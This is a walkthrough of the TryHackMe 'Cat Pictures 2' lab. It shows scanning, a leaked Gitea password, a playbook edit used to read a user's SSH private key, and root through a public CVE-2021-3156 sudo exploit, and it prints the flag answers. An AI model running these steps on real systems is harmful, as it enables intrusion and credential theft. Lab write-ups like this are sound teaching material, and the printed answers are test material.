# [Cat Pictures 2](https://tryhackme.com/room/catpictures2)

> Now with more Cat Pictures!

## Scanning

scan the target

```
nmap -A -T4 10.10.242.208
```

we have a huge of information here (22,80,222,3000,8080

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/feb2bd3a-4dda-47ab-a7de-475dd8cf7fb6)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5e27774a-d861-45cd-81f9-6ff7c2675c6d)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/78409cf6-feb0-446c-8657-650238e77379)

## HTTP

explore the webserver on port 80, we have an ablums

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bf345fb0-88cf-491d-ba75-e7b0be9f9012)

check the robots.txt

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1ef16d46-e8f3-4de1-9b16-7f2cab61c9d2)

on login panel, we know that's Lyche 3.1.1

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/709b050e-7bdf-4081-987a-37424dda9e32)

click on ablums, we have some cat images

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8cf3b3b0-1bfa-4a1e-bfd4-148d99d53c36)

we have a nginx webserver on port 8080

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b12eb582-5c88-4124-8b6d-257b2c01ace2)

on port 3000, i see a Gitea version 1.17.3

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9a53d313-bf59-48a4-af9f-4ee13fa0f9c8)

click on explore/user, it already have an user `samarium`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c168284c-7abb-4ecd-a5b8-68680fac4f18)

## Enumeration

i found a descript on first picture `note to self: strip metadata`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8dc91eae-9d5e-482d-a891-fa35ce7ff5e4)

download and check its metadata

```
exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3af1cd8d-73ae-4521-8a9c-d9a107667350)

The Title header has a link to a text file on port 8080

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9625573f-9e45-491e-83d5-c41c60a819df)

follow the link, i have a credential

```
gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

login gitea server with that information

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8e6d0e17-dcd3-4665-8a29-c79a7a08e773)

check on ansible repo

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3d5cea37-989f-41fe-ae98-389e33bc406d)

| Flag | flag1.txt |
| --- | --- |
| Answer | 10d916eaea54bb5ebe36b59538146bb5 |

check the playbook.yml, i found something maybe interest

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/271b9c1f-7736-4401-8c83-c13d849209a1)

it runs the `whoami` command as the user `bismuth`

as we remember, there is an Ansible runner present on port 1337

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a531890c-bd02-4531-af1b-884599446618)

i can click on `Run Ansible Playbook` to execute the playbook command and see its log

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/216a39e8-309c-4bba-8041-b261ff943c99)

## Exploitation

return the repo, i see that we can edit the `playbook.yml` on gitea

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7e5629b7-9657-4826-9f65-6296ac05fc29)

```
ls -la
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d9e6b1cc-3516-48ed-a81e-83c1ab6dcdaa)

```
cat flag2.txt
```

| Flag | user.txt |
| --- | --- |
| Answer | 5e2cafbbf180351702651c09cd797920 |

to get into the system, instead of using reverse shell, i think i will leverage ssh in the scan before

```
cat .ssh/id_rsa
```

get the private key of `bismuth`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fce8e59c-7cd5-4a5d-8665-95531bffa707)

removing `"`, `,` and the spaces with cyberchef or with can do yourself

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/362af291-8710-499d-ad8e-ddb065c1fc79)

```
vi id_rsa
chmod 600 id_rsa
ssh -i id_rsa bismuth@10.10.242.208
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c72653fa-e80a-4c9d-9c1e-bac43aa3a573)

## Privilege Escalation

check the sudo version

```
sudo --version
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f119c3b7-b093-4db0-aa40-abf2c9fd863c)

there is a cve-2021-3156 for it

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6c2b22af-2c09-4efb-8ae7-8ffd6d54640c)

clone and transfer to the target via scp

```
git clone https://github.com/CptGibbon/CVE-2021-3156
scp -i id_rsa CVE-2021-3156/exploit.c bismuth@10.10.97.70:/home/bismuth/exploit.c
scp -i id_rsa CVE-2021-3156/shellcode.c bismuth@10.10.97.70:/home/bismuth/shellcode.c
scp -i id_rsa CVE-2021-3156/Makefile bismuth@10.10.97.70:/home/bismuth/Makefile
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/01088266-ed44-46d2-96ba-fc1d1babf14d)

on target machine

```
ls
make
./exploit
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/58062ba9-3c2e-4828-9459-e0f7d37d0422)

there you go

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bdfa26ef-6919-4c86-868e-917723c9cd85)

| Flag | flag3.txt |
| --- | --- |
| Answer | 6d2a9f8f8174e86e27d565087a28a971 |
